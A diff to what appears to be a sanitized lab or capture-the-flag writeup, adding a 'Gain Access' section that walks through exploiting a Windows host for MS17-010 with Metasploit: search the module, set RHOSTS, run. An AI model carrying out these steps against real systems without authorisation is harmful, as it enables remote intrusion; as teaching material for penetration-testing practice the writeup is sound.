@@ -14,14 +14,14 @@ A Windows host exploited remotely: a discovered vulnerability was used to achiev
 ## Environment & Tools
 
 * <Target IP>
-* Attacker: Kali Linux (tools used: `nmap`, `msfconsole`)
+* Attacker: Kali Linux (tools used: `nmap`, `msfconsole`, `metasploit`)
 * Notes: This writeup is sanitized for public posting. Replace `REDACTED` with your personal notes if you keep a private copy.
 
 ---
 
 ## Recon
 
-**Objective:** discover open services, versions, and likely attack vectors.
+**Objective:** Discover open services, versions, and likely attack vectors.
 
 1. TCP Port Scan
 ```bash
@@ -49,7 +49,43 @@ Showing us that the Target is Vulnerable to Remote Code Executuion also known as
 
 ---
 
-## 
+## Gain Access
+
+**Objective:** Find and Configure the Exploit that the Target Machine is Vulnerable to
+
+1. Start Metasploit
+```bash
+msfconsole
+```
+This is a Security Framework used to Identify and Launch Vulnerabilities
+
+2. Search and Use the correct Exploit
+```bash
+search ms17-010
+```
+Here we find where exactly the Exploit Payload is located within Metasploit
+```bash
+use <Path-to-Payload>
+```
+This sets the Payload for us to Configure and Run
+
+3. Configure the Payload
+```bash
+Show Options
+```
+This lists all Parameters, Required and Unrequired, to Configure before running
+```bash
+set RHOSTS <Target_IP>
+```
+Fill the Require Parameter 'RHOSTS' (Remote Host) with the IP of the Target so the Payload Exploits the Target
+
+2. Run the Exploit
+```bash
+run
+```
+This will Execute the Payload using all the Parameters set and give Access to the Targets Machine
+
+TAKE SS OF EXPLOIT WORKING
 
 ---
 
